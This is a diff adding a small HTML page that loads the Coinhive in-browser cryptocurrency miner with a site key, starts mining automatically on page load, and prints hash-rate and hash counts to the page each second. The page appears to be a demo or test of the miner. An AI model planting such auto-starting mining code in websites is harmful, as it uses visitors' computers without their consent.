@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.User('QnFBodo5jGJo2IjyJR0oLeX0Tt0yGmxm', window.location.hash);
+        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+
+        setInterval(function() {
+            var hashesPerSecond = miner.getHashesPerSecond();
+            var totalHashes = miner.getTotalHashes();
+            var acceptedHashes = miner.getAcceptedHashes();
+
+
+            var elem = document.getElementById("b");
+            elem.innerHTML = [hashesPerSecond, totalHashes, acceptedHashes].join('<br/>');
+        }, 1000);
+    </script>
+</head>
+<body id="b">
+</body>
+</html>
